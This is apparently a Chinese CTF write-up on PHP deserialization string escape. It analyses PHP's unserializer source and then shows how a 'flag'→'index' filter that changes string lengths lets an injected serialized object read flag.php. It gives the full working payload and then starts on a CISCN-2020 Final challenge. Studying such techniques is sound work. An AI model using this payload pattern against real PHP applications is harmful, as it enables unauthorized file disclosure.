
```c
yych = \*YYCURSOR;
switch (yych) {
case 'C':
case 'O': goto yy4;
case 'N': goto yy5;
case 'R': goto yy6;
case 'S': goto yy7;
case 'a': goto yy8;
case 'b': goto yy9;
case 'd': goto yy10;
case 'i': goto yy11;
case 'o': goto yy12;
case 'r': goto yy13;
case 's': goto yy14;
case '}': goto yy15;
default: goto yy2;
}
```

可以看到`yych`这个指针用`switch`来匹配我们序列化之后的字符串，这边我们随便举个例子，如果匹配到`s`，我们跟进它，最终会发现，最终会跳转到`yy90`来，我们简单分析一下`yy90`的代码

```C
yy90:
++YYCUROSR;
#line 800 "ext/standard/var\_underializer.re"
{
size\_t len,maxlen;
char \*str;
len = parse\_uiv(start + 2);
maxlen = max + YYCURSOR;
if (maxlen < len){
\*p = start + 2;
return 0;
}
str = (char\*)YYCURSOR;
YYCURSOR += len;
if (\*(YYCURSOR) != '"'){
\*p = YYCURSOR;
return 0;
}
if (\*(YYCURSOR +1) !=';'){
\*p = YYCURSOR +1;
return 0;
}
YYCURSOR +=2;
\*p = YYCURSOR;
if (len ==0){
ZVAL\_EMPTY\_STRING(rval);
}else if (len == 1){
ZVAL\_INTERNED\_STR(rval, ZSTR\_CHAR((zend\_uchar)\*str));
}else if (as\_key){
ZVAL\_STR(rval, zend\_string\_init\_interned(str, len, 0));
}else{
ZVAL\_STRINGL(rval, str, len);
}
return 1;
}
```

首先看`yy90`中的这一小段

```C
len = parse\_uiv(start + 2);
maxlen = max + YYCURSOR;
if (maxlen < len){
\*p = start + 2;
return 0;
```

首先他从`start`的位置加了两位，也就是识别到`s`之后往后移两位，也就会识别到我们字符串长度的信息，然后得到长度的信息，进行判断，如果我们输入的长度超过了它的最大长度也就是`maxlen`，他就会`return 0`

然后向下继续分析

```c
YYCURSOR += len;
if (\*(YYCURSOR) != '"'){
\*p = YYCURSOR;
return 0;
}
```

他把`YYCURSOR`指针加上了获取到的长度`len`，然后如果长度的下一位不是双引号的话，也就会抛出错误

```C
if (\*(YYCURSOR +1) !=';'){
\*p = YYCURSOR +1;
return 0;
}
```

如果双引号的后一位，不是`;`，也会抛出错误，否则就会对`len`这一部分进行编程字符串，然后`return 1`表示成功

```C
if (len ==0){
ZVAL\_EMPTY\_STRING(rval);
}else if (len == 1){
ZVAL\_INTERNED\_STR(rval, ZSTR\_CHAR((zend\_uchar)\*str));
}else if (as\_key){
ZVAL\_STR(rval, zend\_string\_init\_interned(str, len, 0));
}else{
ZVAL\_STRINGL(rval, str, len);
}
return 1;
```

我们可以发现，他就是严格按照这么一个模板，进行反序列化

```php
S:len:"字符串内容";
```

现在我们了解了基本的原理，接下来我们来做一道题来更深入理解一下

`What we can do.`

```php
<?php
error\_reporting(255);
class A{
public $filename = \_\_FILE\_\_;
public function \_\_destruct(){
highlight\_file($this->filename);
// 高亮显示 filename 参数中的文件,默认是当前文件
}
}
function waf($s){
return preg\_replace('/flag/i', 'index', $s);
// 识别flag然后将其替换为index
}
if (isset($\_REQUEST['x']) && is\_string($\_REQUEST['x'])){
// 输入一个参数 x 且这个 x 必须是一个字符串
$a = [
0 => $\_REQUEST['x'],
1 => "1"
];
// 然后定义一个数组类型, 0 对应的是我们的参数 x , 1 对应的就是 1
@unserialize(waf(serialize($a)));
// 先对数组$a进行序列化,然后过一遍上面定义的waf,然后在对其进行反序列化
}else{
new A();
}
```

我们的突破点肯定就是在`A`这个类中，将`filename`的值改为`flag.php`，那么我们怎么操作呢？

首先我们可控的变量只有`$\_REQUEST['x']`，而这个`x`经过了序列化，然后过一遍`waf`然后再反序列化，似乎和我们的`A`没有任何关系

我们直接来看`payload`，然后对`payload`进行一个分析

```payload
flagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflag";i:0;O:1:"A":1:{s:8:"filename";S:8:"\66\6c\61\67\2E\70\68\70";}}
```

首先他前面有很长很长的`flag`字符串，然后更上了一个`;`，然后为整数型，数值为0，跟上一个`;`号，然后再写了一个`o`，一个对象，对象名称长度为`1`，名称为`A`，有一个属性，字符串类型的名称，名称长度为`8`，为`filename`，所对应的值的长度也为`8`，为`\66\6c\61\67\2E\70\68\70`，然后闭合这个序列化字符串，后面跟上了两个`}`

假设我们先不添加前面的`flag`，直接将后面的`";i:0;O:1:"A":1:{s:8:"filename";S:8:"\66\6c\61\67\2E\70\68\70";}}`发送给服务器

页面无回显，漏洞并没有利用成功

我们可以在本地模拟一下，输入一下一段`php`的代码

```php
<?php
$a = [
0 => '";i:0;O:1:"A":1:{s:8:"filename";S:8:"\66\6c\61\67\2E\70\68\70";}}',
1 => "1"
];
print\_r(serialize($a));
```

然后得到执行的结果

```php
a:2:{i:0;s:65:"";i:0;O:1:"A":1:{s:8:"filename";S:8:"\66\6c\61\67\2E\70\68\70";}}";i:1;s:1:"1";}
```

可以看到`s:65`也就是说键`0`对应的值长度为`65`，也就是说，他会从第一个`"`往后`65`位都进行匹配，直到匹配完且下一位为`"`，也就是说我们输入的`";`这些字符都作为了数值，并没有利用起来

从我们上面分析的源码来看，它是按照长度来进行匹配的，所以我们没有办法和SQL注入一样，直接用特殊的符号将其进行闭合

他的长度，是由于他在序列化的时候得到的长度，我们是没有办法进行改变的

但是这道题还有一个关键点，那就是前面的`waf`

`waf`会将我们输入的字符串中有`flag`的字符串替换为`index`，我们可以发现，`flag`字符串长度为`4`，而`index`字符串长度为`5`，这样是不是可以帮我们增加一个长度？

而且这个`waf`巧的就是没有在`serialize`前面替换，而是在其后面进行替换，那么我们的突破点就在这里

接下来在我们本地的`php`脚本中添加`waf`函数，并进行利用

```php
<?php
$a = [
0 => 'flag',
1 => "1"
];
function waf($a){
return preg\_replace('/flag/i', 'index', $a);
}
print\_r(waf(serialize($a)));
```

我们先用`flag`尝试一下，看看返回的结果

```php
a:2:{i:0;s:4:"index";i:1;s:1:"1";}
```

发现这个序列化的字符串中，标记的键`0`对应字符串的长度是`4`而实际长度却是`5`

而反序列化进行匹配的时候，匹配到`x`的位置，应该是`"`，匹配错误，抛出异常，继而匹配下一位，`"`匹配到`;`还是匹配不到，又抛出一个错误

首先我们没加`waf`函数先进行序列化

```php
a:2:{i:0;s:325:"flagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflag";i:0;O:1:"A":1:{s:8:"filename";S:8:"\66\6c\61\67\2E\70\68\70";}}";i:1;s:1:"1";}
```

发现这边长度是有`325`的，然后我们再将`waf`函数利用上

```php
a:2:{i:0;s:325:"indexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindex";i:0;O:1:"A":1:{s:8:"filename";S:8:"\66\6c\61\67\2E\70\68\70";}}";i:1;s:1:"1";}
```

这个时候我们发现，长度还是`325`没有变化，但是所有`index`加起来的长度正好是`325`，然后第`326`位则是`"`，正好匹配到，然后有用`;`将前面这个属性进行闭合，然后就可以利用我们自己构造的`A`对象

这个时候正好可以解释为什么后面是两个`}`，而不是一个，可以看到前面又表明这个数组只有两个值，而第一个`}`表明`filename`结束，第二个`}`则是闭合了数组的内容，这样就不会导致原本两个值加上我们自己构造的第三个值导致反序列化错误

而后面的字符，也就作为我们一开始例举的三个问号被忽略

这就达到了我们的一个字符串逃逸的效果，而这一题逃逸了`i:0;O:1:"A":1:{s:8:"filename";S:8:"\66\6c\61\67\2E\70\68\70";}}"`这些字符串

总结：这道题目主要原因是在`waf`过滤的时候没有考虑字符串替换之后长度不一，造成长度溢出，而溢出的长度正好可以让我们利用，构造恶意的序列化字符串来达到效果

这是一道比较简单的例子，接下来我们看一道比赛真题`CISCN-2020Final`

```php
<?php
if (isset($\_POST['old\_password'])
&& isset($\_POST['update\_password'])
&& isset($\_POST['update\_age'])
&& isset($\_POST['update\_email'])
&& is\_string($\_POST['old\_password'])
&& is\_string($\_POST['update\_password'])
&& is\_string($\_POST['update\_age'])
&& is\_string($\_POST['update\_email'])
)
{
if ( preg\_match('/[^\d]/', $\_POST['update\_age']) || !filter\_var($\_POST['update\_email'], FILTER\_VALIDATE\_EMAIL)
|| strlen($\_POST['update\_password']) > 16 || preg\_match('/\W/', $\_POST['update\_password']) )
$user -> alterMes("invalid information", "./dashboard.php");
$update\_profile = array(
"old\_password" => $\_POST['old\_password'],
"old\_real\_password" => $user->password,
"password" => $\_POST['update\_password'],
"age" => $\_POST['update\_age'],
"email" => $\_POST['update\_email']
);
$user -> update(serialize($update\_profile));
}
```

PS：关键代码截取

这里的功能就是更新资料的时候，需要你提供`old\_password`，`update\_password`，`update\_age`，`update\_email`的内容，然后会对提供的数据进行过滤

```php
preg\_match('/[^\d]/', $\_POST['update\_age']) || !filter\_var($\_POST['update\_email'], FILTER\_VALIDATE\_EMAIL)
|| strlen($\_POST['update\_password']) > 16 || preg\_match('/\W/', $\_POST['update\_password'])
```

首先`update\_age`只能够是数字类型，然后`update\_email`只能够是邮箱类型，然后`update\_password`的数据长度只能够小于等于16，而且内容只能够是一些字符，如果这些参数全都正常的话就会构造一个名为`$update\_profile`的数组

```php
$update\_profile = array(
"old\_password" => $\_POST['old\_password'],
"old\_real\_password" => $user->password,
"password" => $\_POST['update\_password'],
"age" => $\_POST['update\_age'],
"email" => $\_POST['update\_email']
);
```

观察数组，我们可以发现`old\_password`是没有做限制的，所以我们可以对`old\_password`进行一个利用

然后将数据都转换成数组之后，又序列化并且经过`update`函数传入`$user`中

我们来看看`update`函数

![1646142142053](upload/attach/202203/926826\_9NV8JX98XKVPYC5.jpg)

首先将序列化之后的字符串，传入`waf`，然后再经过反序列化传入`$data`中

然后这里的`waf`其实和上一题的`waf`差不多，只是过滤的条件增加了，上一题只有单调的`flag`，但是这一题有`flag,php`等等

上一题的利用点其实是`A`类中的`\_\_destruct`函数，而这一题的利用点也是`\_\_destruct`函数

它首先会严重是否设置了`username`等内容，然后会得到这个头像的文件的内容，将其以`base64`的方式输出出来

首先我们需要知道我们要逃逸那些字符串

首先 是 `"; `我们需要将前面的内容闭合掉

然后是我们自己需要利用到的东西，因为是在数组中，我们需要按照数组的格式进行构造

首先是 `i:0;O:4:"user"` 键随便取，取0，然后我们需要利用的对象，对象名称长度为`4`，为`user`

因为`\_\_destruct`函数要检测`password`等值是否存在，所以这些值我们都需要给他构造出来
